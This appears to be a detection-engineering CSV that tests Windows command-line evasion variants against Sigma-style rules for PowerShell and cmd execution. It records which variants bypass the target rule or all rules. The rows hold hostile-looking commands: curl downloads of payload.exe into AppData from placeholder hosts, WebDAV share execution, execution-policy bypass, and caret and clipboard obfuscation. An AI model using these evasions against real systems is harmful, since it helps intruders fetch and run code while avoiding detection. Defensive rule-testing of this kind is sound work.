Technical,Rule_name,Title,Rule_id,Command_match_rule,Commandline_evasion,Excutable,Bypass target rule,Bypass all rule,Trigger rule
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl http://example.local/test.txt -o C:\Users\Public\AppData\Roaming\test.txt""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl http://example.local/test.txt -o C:\Users\Public\AppData\Roaming\test.txt""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""set A=App&& set D=Data&& cmd /c curl h^ttp://example.local/test.txt -o %USERPROFILE%\%A%%D%\Roaming\test.txt""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /V:ON /c ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /V:oN /c ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /v:on /c ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /""V:ON"" /c ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /v:ON /C ""curl http://example.com/payload.exe -o !AppData!\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_net_use_and_exec_combo,Suspicious File Execution From Internet Hosted WebDav Share,f0507c0f-a3a2-40f5-acc6-7f543c334993,,"cmd.exe /c "" net use https://192.0.2.1/share & start \\192.0.2.1\DavWWWRoot\payload.exe """,TRUE,TRUE,FALSE,Windows Internet Hosted WebDav Share Mount Via Net.EXE (7e6237fe-3ddb-438f-9381-9bf9de5af8d0); Windows Share Mount Via Net.EXE (f117933c-980c-4f78-b384-e3d838111165); System Network Connections Discovery Via Net.EXE (1c67a717-32ba-409b-a45d-0fb704a73a81)
t1059.001,proc_creation_win_cmd_net_use_and_exec_combo,Suspicious File Execution From Internet Hosted WebDav Share,f0507c0f-a3a2-40f5-acc6-7f543c334993,,"cmd.exe /C "" net use https://192.0.2.1/share & start \\192.0.2.1\DavWWWRoot\payload.exe """,TRUE,TRUE,FALSE,Windows Internet Hosted WebDav Share Mount Via Net.EXE (7e6237fe-3ddb-438f-9381-9bf9de5af8d0); Windows Share Mount Via Net.EXE (f117933c-980c-4f78-b384-e3d838111165); System Network Connections Discovery Via Net.EXE (1c67a717-32ba-409b-a45d-0fb704a73a81)
t1059.001,proc_creation_win_hh_susp_execution,Suspicious HH.EXE Execution,e8a95b5e-c891-46e2-b33a-93937d3abc31,,"cmd.exe /c ""cd C:\Users\Public\Downloads && hh.exe payload.chm""",TRUE,TRUE,FALSE,HH.EXE Execution (68c8acb4-1b60-4890-8e82-3ddf7a6dba84)
t1059.001,proc_creation_win_hh_susp_execution,Suspicious HH.EXE Execution,e8a95b5e-c891-46e2-b33a-93937d3abc31,,"cmd.exe /c ""copy C:\Windows\hh.exe C:\ProgramData\not_hh.exe && C:\ProgramData\not_hh.exe C:\Users\%USERNAME%\Documents\payload.chm""",TRUE,TRUE,FALSE,HH.EXE Execution (68c8acb4-1b60-4890-8e82-3ddf7a6dba84)
t1059.001,proc_creation_win_hh_susp_execution,Suspicious HH.EXE Execution,e8a95b5e-c891-46e2-b33a-93937d3abc31,,"cmd.exe /c ""cd %USERPROFILE%\Downloads && hh.exe payload.chm""",TRUE,TRUE,FALSE,HH.EXE Execution (68c8acb4-1b60-4890-8e82-3ddf7a6dba84)
t1059.001,proc_creation_win_hktl_crackmapexec_execution_patterns,HackTool - CrackMapExec Execution Patterns,058f4380-962d-40a5-afce-50207d36d7e2,,"powershell.exe -""nop"" -noni -w 1 -exEC bypass -Command ""Write-Host 'Test'""",TRUE,TRUE,FALSE,Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180)
t1059.001,proc_creation_win_hktl_invoke_obfuscation_stdin,Invoke-Obfuscation STDIN+ Launcher,6c96fc76-0eb1-11eb-adc1-0242ac120002,,"cmd.exe /c ""echo Write-Host 'Bypass' | powershell.exe -noprofile -command -""",TRUE,TRUE,TRUE,
t1059.001,proc_creation_win_hktl_invoke_obfuscation_stdin,Invoke-Obfuscation STDIN+ Launcher,6c96fc76-0eb1-11eb-adc1-0242ac120002,,"cmd.exe /C ""echo Write-Host 'Bypass' | powershell.exe -noprofile -command -""",TRUE,TRUE,TRUE,
t1059.001,proc_creation_win_hktl_invoke_obfuscation_via_use_clip,Invoke-Obfuscation Via Use Clip,e1561947-b4e3-4a74-9bdd-83baed21bdb5,,"cmd.exe /c echo Write-Host ""'Bypass Test'"" | clip & powershell -""c"" IEX([Windows.Forms.Clipboard]::GetText())",TRUE,TRUE,TRUE,
t1059.001,proc_creation_win_powershell_public_folder,Execution of Powershell Script in Public Folder,fb9d3ff7-7348-46ab-af8c-b55f5fbf39b4,,"cmd.exe /c ""type C:\Users\Public\script.ps1 | powershell.exe -noprofile -""",TRUE,TRUE,TRUE,
t1059.001,proc_creation_win_powershell_susp_parent_process,Suspicious PowerShell Parent Process,754ed792-634f-40ae-b3bc-e0448d33f695,,"C:\WINDOWS\system32\cmd.exe /c ""powershell.exe"" -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt",TRUE,TRUE,TRUE,
t1059.001,proc_creation_win_powershell_susp_parent_process,Suspicious PowerShell Parent Process,754ed792-634f-40ae-b3bc-e0448d33f695,,C:\WINDOWS\system32\cmd.exe /k powershell.exe -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt,TRUE,TRUE,TRUE,
t1059.001,proc_creation_win_susp_embed_exe_lnk,Hidden Powershell in Link File Pattern,30e92f50-bb5a-4884-98b5-d20aa80f3d7a,,"C:\Windows\System32\cmd.exe /c p^o^w^e^r^s^h^e^l^l.exe /""nop"" -ep bypass -""c"" ""Write-Host 'Bypass'""",TRUE,TRUE,FALSE,Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180)
t1059.001,proc_creation_win_susp_embed_exe_lnk,Hidden Powershell in Link File Pattern,30e92f50-bb5a-4884-98b5-d20aa80f3d7a,,"C:\Windows\System32\cmd.exe /C p^o^w^e^r^s^h^e^l^l.exe -""nop"" -""ep"" bypass -""c"" ""Write-Host 'Bypass'""",TRUE,TRUE,TRUE,
t1059.001,proc_creation_win_susp_embed_exe_lnk,Hidden Powershell in Link File Pattern,30e92f50-bb5a-4884-98b5-d20aa80f3d7a,,"C:\Windows\System32\cmd.exe /c powershell.exe -""nop"" -Ep bypass -C ""Start-Process calc.exe""",TRUE,TRUE,FALSE,Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180)
t1059.001,proc_creation_win_susp_embed_exe_lnk,Hidden Powershell in Link File Pattern,30e92f50-bb5a-4884-98b5-d20aa80f3d7a,,"C:\Windows\System32\cmd.exe /C powershell.exe /""nop"" -ep bypass -c ""Start-Process calc.exe""",TRUE,TRUE,FALSE,Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180)
t1059.001,proc_creation_win_susp_embed_exe_lnk,Hidden Powershell in Link File Pattern,30e92f50-bb5a-4884-98b5-d20aa80f3d7a,,"C:\Windows\System32\cmd.exe /c powershell.exe -nop /""ep"" bypass -c ""Start-Process calc.exe""",TRUE,TRUE,TRUE,
t1059.001,proc_creation_win_susp_embed_exe_lnk,Hidden Powershell in Link File Pattern,30e92f50-bb5a-4884-98b5-d20aa80f3d7a,,"C:\Windows\System32\cmd.exe /C powershell.exe -nop -ep bypass /""c"" ""Start-Process calc.exe""",TRUE,TRUE,FALSE,Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180)
t1059.001,proc_creation_win_susp_embed_exe_lnk,Hidden Powershell in Link File Pattern,30e92f50-bb5a-4884-98b5-d20aa80f3d7a,,"C:\Windows\System32\cmd.exe /c powershell.exe -nop -""ep"" bypass -""c"" ""Start-Process calc.exe""",TRUE,TRUE,TRUE,
t1059.001,proc_creation_win_susp_embed_exe_lnk,Hidden Powershell in Link File Pattern,30e92f50-bb5a-4884-98b5-d20aa80f3d7a,,"C:\Windows\System32\cmd.exe /c powershell.exe -nOp /""ep"" bypass -""c"" ""Start-Process calc.exe""",TRUE,TRUE,TRUE,
t1059.001,proc_creation_win_susp_embed_exe_lnk,Hidden Powershell in Link File Pattern,30e92f50-bb5a-4884-98b5-d20aa80f3d7a,,"C:\Windows\System32\cmd.exe /C powershell.exe -""nop"" -EP bypass -C ""Start-Process calc.exe""",TRUE,TRUE,FALSE,Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180)
t1059.001,proc_creation_win_webdav_lnk_execution,Potentially Suspicious WebDAV LNK Execution,1412aa78-a24c-4abd-83df-767dfb2c5bbe,,"wmic.exe process call create ""\\192.168.1.50\DavWWWRoot\share\payload.exe""",TRUE,TRUE,FALSE,Suspicious Process Created Via Wmic.EXE (3c89a1e8-0fba-449e-8f1b-8409d6267ec8); New Process Created Via Wmic.EXE (526be59f-a573-4eea-b5f7-f0973207634d)
t1059.001,proc_creation_win_susp_cli_obfuscation_unicode_img,Potential CommandLine Obfuscation Using Unicode Characters From Suspicious Image,584bca0f-3608-4402-80fd-4075ff6072e3,,"cmd.exe /c ""w^h^o^a^m^i""",TRUE,TRUE,FALSE,Local Accounts Discovery (502b42de-4306-40b4-9596-6f590c81f073)
t1059.001,proc_creation_win_susp_cli_obfuscation_unicode_img,Potential CommandLine Obfuscation Using Unicode Characters From Suspicious Image,584bca0f-3608-4402-80fd-4075ff6072e3,,"cmd.exe /C ""w^h^o^a^m^i""",TRUE,TRUE,FALSE,Local Accounts Discovery (502b42de-4306-40b4-9596-6f590c81f073)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl -o %A^ppData%\test.exe h^t^t^p://[example.com/test.exe]()""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl -o %A^ppData%\test.exe h^t^t^p://[example.com/test.exe]()""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl h^tt^ps://example.com/file.exe -o %AP^PDATA%\file.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""set protocol=http&& set url=://example.com/file.exe&& set dest=%USERPROFILE%\AppData\Roaming\file.exe&& call curl %protocol%%url% -o %dest%""",TRUE,TRUE,FALSE,Curl Download And Execute Combination (21dd6d38-2b18-4453-9404-a0fe4a0cc288); Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""set protocol=http&& set url=://example.com/file.exe&& set dest=%USERPROFILE%\AppData\Roaming\file.exe&& call curl %protocol%%url% -o %dest%""",TRUE,TRUE,FALSE,Curl Download And Execute Combination (21dd6d38-2b18-4453-9404-a0fe4a0cc288); Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %AppData%\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %AppData%\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Potential Commandline Obfuscation Using Escape Characters (f0cdd048-82dc-4f7a-8a7a-b87a52b6d0fd); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl http://example.com/payload.exe -o %USERPROFILE%\AppData\Roaming\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl http://example.com/payload.exe -o %USERPROFILE%\AppData\Roaming\payload.exe""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /c ""curl http://example.local/test.txt -o C:\Users\Public\AppData\Roaming\test.txt""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1059.001,proc_creation_win_cmd_http_appdata,Command Line Execution with Suspicious URL and AppData Strings,1ac8666b-046f-4201-8aba-1951aaec03a3,,"cmd.exe /C ""curl http://example.local/test.txt -o C:\Users\Public\AppData\Roaming\test.txt""",TRUE,TRUE,FALSE,Suspicious Curl.EXE Download (e218595b-bbe7-4ee5-8a96-f32a24ad3468); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
